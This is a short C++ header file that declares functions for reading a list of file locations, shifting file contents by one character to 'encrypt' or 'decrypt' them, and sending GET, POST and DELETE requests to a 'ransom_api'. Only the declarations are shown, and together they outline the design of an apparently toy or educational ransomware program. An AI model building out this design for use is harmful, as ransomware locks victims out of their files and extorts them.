#pragma once

//Function to read locations and push them into a vector.
bool getFileContents(std::string fileName, std::vector<std::string> & fileContents);

//Basic function to read all chars and increment them by one. 
void basicEncryptContent(std::string& content);

//Basic function to read all chars and decrement them by one.
void basicDecryptContent(std::string& content);

//Get request to ransom_api.
std::string get_request(std::string uri);

//Post Request to ransom_api.
void post_request(std::string body);

std::string delete_request(std::string id);